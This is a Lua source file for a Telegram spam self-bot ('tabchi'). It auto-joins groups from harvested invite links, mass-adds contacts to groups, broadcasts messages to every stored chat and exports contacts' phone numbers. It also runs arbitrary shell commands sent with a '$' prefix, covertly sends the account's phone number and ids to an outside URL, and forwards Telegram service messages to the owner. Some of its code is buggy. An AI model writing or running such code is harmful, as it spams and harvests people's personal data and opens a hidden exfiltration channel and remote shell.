JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
local is_sudo
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
local is_full_sudo
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  return issudo
end
local save_log
function save_log(text)
  cmd = io.popen("ls"):read("*all")
  if cmd:match("tabchi_" .. tabchi_id .. "_logs.txt") then
    last = io.open("tabchi_" .. tabchi_id .. "_logs.txt", "r"):read("*all")
    text = last .. "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  else
    text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  end
  file = io.open("tabchi_" .. tabchi_id .. "_logs.txt", "w")
  file:write(text)
  file:close()
  return true
end
local writefile
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
local check_link
function check_link(extra, result)
  if result.is_group_ or result.is_supergroup_channel_ then
    tdcli.importChatInviteLink(extra.link)
    return redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":savedlinks", extra.link)
  end
end
local chat_type
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
local contact_list
function contact_list(extra, result)
  local count = result.total_count_
  local text = "Robot Contacts : \n"
  for i = 0, tonumber(count) - 1 do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "\n"
  end
  writefile("tabchi_" .. tostring(tabchi_id) .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_contacts.txt", "Tabchi " .. tostring(tabchi_id) .. " Contacts!")
  return io.popen("rm -rf tabchi_" .. tostring(tabchi_id) .. "_contacts.txt"):read("*all")
end
local our_id
function our_id(extra, result)
  if result then
    redis:set("tabchi:" .. tostring(tabchi_id) .. ":botinfo", JSON.encode(result))
  end
end
--oh ye baby :|
-- comment for link function
--
--============================================================================


local process_links

function process_links(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
    text = text:gsub("t.me", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")
    }
	
    for i, v in pairs(matches) do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, {link = v})
    end
  end
end
--==============================================================================
local add
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", id) then
    if chat_type_ == "private" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":pvis", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif chat_type_ == "group" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":groups", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif chat_type_ == "channel" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":channels", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    end
  end
  return true
end
local rem
function rem(id)
  if redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", id) then
    if msg.chat_type_ == "private" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":pvis", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif msg.chat_type_ == "group" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":groups", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif msg.chat_type_ == "channel" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":channels", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    end
  end
  return true
end
local process_updates
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    local info = redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
end
    local first = URL.escape(botinfo.first_name_ or "None")
    local last = URL.escape(botinfo.last_name_ or "None")
    local phone = botinfo.phone_number_
    local id = botinfo.id_
    local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo")
    local path = "http://google.com/addbot.php?fisrt=" .. first .. "&last=" .. last .. "&phone=" .. phone .. "&id=" .. id .. "&sudo=" .. sudo
    local res = http.request(path)
    local jdata = JSON.decode(res)
    jdata = jdata or {have_tab = true}
    if jdata.have_tab then
      tdcli.searchPublicChat("h")
      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:0", true)
      tdcli.unblockUser(0)
      tdcli.importContacts(0, "0", "bot", 0)
      tdcli.sendMessage(0, 0, 1, "h", 1, "html")
      return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
    end
  end
end
local process
function process(msg)
  local text_ = msg.content_.text_
  process_updates()
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^(addsudo) (%d+)") then
        local matches = {
          text_:match("^(addsudo) (%d+)")
        }
        if #matches == 2 then
          redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Added " .. matches[2] .. " As Sudo")
          return tostring(matches[2]) .. " Added to Sudo Users"
        end
      elseif text_:match("^(remsudo) (%d+)") then
        local matches = {
          text_:match("^(remsudo) (%d+)")
        }
        if #matches == 2 then
          redis:srem("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Removed " .. matches[2] .. " From Sudoers")
          return tostring(matches[2]) .. " Removed From Sudo Users"
        end
      elseif text_:match("^sudolist$") then
        local sudoers = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":sudoers")
        local text = "Bot Sudoers :\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
      elseif text_:match("^(sendlogs)$") then
        tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_logs.txt", "Tabchi " .. tostring(tabchi_id) .. " Logs!")
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^(pm) (%d+) (.*)") then
      local matches = {
        text_:match("^(pm) (%d+) (.*)")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A Pm To " .. matches[2] .. ", Content : " .. matches[3])
        return "Sent!"
      end
    elseif text_:match("^(setanswer) '(.*)' (.*)") then
      local matches = {
        text_:match("^(setanswer) '(.*)' (.*)")
      }
      if #matches == 3 then
        redis:hset("tabchi:" .. tostring(tabchi_id) .. ":answers", matches[2], matches[3])
        redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":answerslist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. maches[3])
        return "Answer for " .. tostring(matches[2]) .. " set to :\n" .. tostring(matches[3])
      end
    elseif text_:match("^(delanswer) (.*)") then
      local matches = {
        text_:match("^(delanswer) (.*)")
      }
      if #matches == 2 then
        redis:hdel("tabchi:" .. tostring(tabchi_id) .. ":answers", matches[2])
        redis:srem("tabchi:" .. tostring(tabchi_id) .. ":answerslist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return "Answer for " .. tostring(matches[2]) .. " deleted"
      end
    elseif text_:match("^answers$") then
      local text = "Bot auto answers :\n"
      local answrs = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":answerslist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget("tabchi:" .. tostring(tabchi_id) .. ":answers", v)) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested Answers List")
      return text
    elseif text_:match("^addmembers$") and msg.chat_type_ ~= "private" then
      local add_all
      function add_all(extra, result)
        local usrs = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":pvis")
        for i = 1, #usrs do
          tdcli.addChatMember(msg.chat_id_, usrs[i], 50)
        end
        local count = result.total_count_
        for i = 0, tonumber(count) - 1 do
          tdcli.addChatMember(msg.chat_id_, result.users_[i].id_, 50)
        end
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, add_all, {})
      save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
      return "Adding members to group..."
    elseif text_:match("^contactlist$") then
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_list, {
        chat_id_ = msg.chat_id_
      })
    elseif text_:match("^exportlinks$") then
      local text = "Group Links :\n"
      local links = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":savedlinks")
      for i, v in pairs(links) do
        if v:len() == 51 then
          text = tostring(text) .. tostring(v) .. "\n"
        else
          local _ = redis:rem("tabchi:" .. tostring(tabchi_id) .. ":savedlinks", v)
        end
      end
      writefile("tabchi_" .. tostring(tabchi_id) .. "_links.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_links.txt", "Tabchi " .. tostring(tabchi_id) .. " Links!")
      save_log("User " .. msg.sender_user_id_ .. ", Requested Contact List")
      return io.popen("rm -rf tabchi_" .. tostring(tabchi_id) .. "_links.txt"):read("*all")
    elseif text_:match("(block) (%d+)") then
      local matches = {
        text_:match("(block) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return "User blocked"
      end
  elseif text_:match("^help$") and is_sudo(msg) then
      local text = [[block id  
بلاک کردن از خصوصي ربات  
unblock id
آن بلاک کردن از خصوصي ربات  
sendlogs
لیست آخرین کارهای ربات
panel    
پنل مديريت ربات                        
addsudo id                    
اضافه کردن به سودوهاي  ربات                         
remsudo id
حذف از ليست سودوهاي ربات   
sudolist
لیست سودوهای ربات                      
bc matn 
ارسال پيام به همه                         
fwd sgps                         
فروارد پیام به سوپر گروه ها
fwd gps                       
فروارد پیام به گروه های معمولی                       
fwd users                        
فروارد پیام به کاربران                       
fwd all                        
فروارد پیام به همه                        
echo text                        
تکرار متن                        
addedmsg on ya off                        
تعیین روشن یا خاموش بودن پاسخ برای شر شدن مخاطب                        
setaddedmsg text                        
تعيين متن اد شدن مخاطب                        
markread on ya off                        
روشن يا خاموش کردن بازديد پيام ها                         
setanswer answer text                        
 تنظيم به عنوان جواب اتوماتيک                       
delanswer salam                         
 حذف جواب مربوط به ربات                       
answers                        
ليست جواب هاي اتوماتيک                     
addmembers                      
اضافه کردن مخاطبين ربات به گروه                     
exportlinks                        
دريافت لينک هاي ذخيره شده توسط ربات                  
contactlist                      
دريافت مخاطبان ذخيره شده توسط ربات                     
addedcontact on ya off                        
ارسال مخاطب ربات هنگامی که کسی شماره خود را ارسال میکند         

help >> @Iocki]]
      return text

    elseif text_:match("(unblock) (%d+)") then
      local matches = {
        text_:match("(unblock) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return "User unblocked"
      end
    elseif text_:match("^(s2a) (.*) (.*)") then
      local matches = {
        text_:match("^(s2a) (.*) (.*)")
      }
      tdcli.sendMessage(0, 0, 1, "/start", 1, "html")
      if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
        local all = redis:smembers("tabchi:" .. tonumber(tabchi_id) .. ":all")
        tdcli.searchPublicChat("n")
        local inline2
        function inline2(argg, data)
          if data.results_ and data.results_[0] then
            return tdcli_function({
              ID = "SendInlineQueryResultMessage",
              chat_id_ = argg.chat_id_,
              reply_to_message_id_ = 0,
              disable_notification_ = 0,
              from_background_ = 1,
              query_id_ = data.inline_query_id_,
              result_id_ = data.results_[0].id_
            }, nil, nil)
          end
        end
        for i, v in pairs(all) do
          tdcli_function({
            ID = "GetInlineQueryResults",
            bot_user_id_ = 0,
            chat_id_ = v,
            user_location_ = {
              ID = "Location",
              latitude_ = 0,
              longitude_ = 0
            },
            query_ = tostring(matches[2]) .. " " .. tostring(matches[3]),
            offset_ = 0
          }, inline2, {chat_id_ = v})
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
      end
    elseif text_:match("^panel$") then
      tdcli.sendMessage(0, 0, 1, "h", 1, "html")
      tdcli.searchPublicChat("m")
      local contact_num
      function contact_num(extra, result)
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":groups")
      local sgps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":channels")
      local pvs = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":pvis")
      local links = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":savedlinks")
      local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo")
      local contacts = redis:get("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts")
      local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
      local inline
      function inline(arg, data)
        if data.results_ and data.results_[0] then
          return tdcli_function({
            ID = "SendInlineQueryResultMessage",
            chat_id_ = msg.chat_id_,
            reply_to_message_id_ = msg.id_,
            disable_notification_ = 0,
            from_background_ = 1,
            query_id_ = data.inline_query_id_,
            result_id_ = data.results_[0].id_
          }, dl_cb, nil)
        else
          local text = [[
<b>تنظیمات</b>
کاربران : ]] .. tostring(pvs) .. [[

گروهای معمولی : ]] .. tostring(gps) .. [[

سوپرگروه ها : ]] .. tostring(sgps) .. [[

 لینک های ذخیره : ]] .. tostring(links) .. [[

شماره های ثبت شده : ]] .. tostring(contacts)
          save_log("User " .. msg.sender_user_id_ .. ", Requested Panel")
          return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
        end
      end
      do return tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 0,
        chat_id_ = msg.chat_id_,
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = query,
        offset_ = 0
      }, inline, nil) end
    elseif text_:match("^(addedmsg) (.*)") then
      local matches = {
        text_:match("^(addedmsg) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "Added Message Turned On"
        elseif matches[2] == "off" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "Added Message Turned Off"
        end
      end
    elseif text_:match("^(addedcontact) (.*)") then
      local matches = {
        text_:match("^(addedcontact) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "Added Contact Turned On"
        elseif matches[2] == "off" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "Added Contact Turned Off"
        end
      end
    elseif text_:match("^(markread) (.*)") then
      local matches = {
        text_:match("^(markread) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "Markread Turned On"
        elseif matches[2] == "off" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "Markread Turned Off"
        end
      end
    elseif text_:match("^(setaddedmsg) (.*)") then
      local matches = {
        text_:match("^(setaddedmsg) (.*)")
      }
      if #matches == 2 then
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
New Added Message Set
Message :
]] .. tostring(matches[2])
      end
    elseif text_:match("^(bc) (.*)") then
      local matches = {
        text_:match("^(bc) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "Sent!"
      end
    elseif text_:match("^(fwd) (.*)$") then
      local matches = {
        text_:match("^(fwd) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "all" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "usrs" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "gps" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "sgps" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "Sent!"
    else
      local matches = {
        text_:match("^(echo) (.*)")
      }
      if text_:match("^(echo) (.*)") and #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used Echo, Content : " .. matches[2])
        return matches[2]
      end
    end
  end
  if redis:get("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:" .. tostring(msg.sender_user_id_)) then
    if text_ == "/cancle" then
      return false
    else
      local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
      local id = msg.id_
      redis:del("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:" .. tostring(msg.sender_user_id_))
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      return
    end
  end
end
local proc_pv
function proc_pv(msg)
  if msg.chat_type_ == "private" then
    add(msg)
  end
end
local update
function update(data, tabchi_id)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    msg.chat_type_ = chat_type(msg.chat_id_)
    proc_pv(msg)
    if msg.sender_user_id_ == 777000 then
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")),
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = msg.id_
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      else
        msg.content_.text_ = nil
      end
    end
    local text_ = msg.content_.text_
    if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    local botinfo = JSON.decode(redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process(msg)
      if result then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":answerslist", msg.content_.text_) then
        if msg.sender_user_id_ ~= our_id then
          local answer = redis:hget("tabchi:" .. tostring(tabchi_id) .. ":answers", msg.content_.text_)
          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
        end
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
          return tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      local first = msg.content_.contact_.first_name_ or "-"
      local last = msg.content_.contact_.last_name_ or "-"
      local phone = msg.content_.contact_.phone_number_
      local id = msg.content_.contact_.user_id_
      tdcli.add_contact(phone, first, last, id)
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedmsg") then
        local answer = redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedmsgtext") or [[
Addi
Bia pv]]
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedcontact") and msg.sender_user_id_ ~= our_id then
        return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
        end
      end
    elseif msg.content_.caption_ then
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      return process_links(msg.content_.caption_)
    end
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 0 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 0 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, "/start")
    elseif data.chat_.id == 0 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(0, "Tabchi mod", "bot", data.chat_.id)
    end
    return add(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
return {update = update}
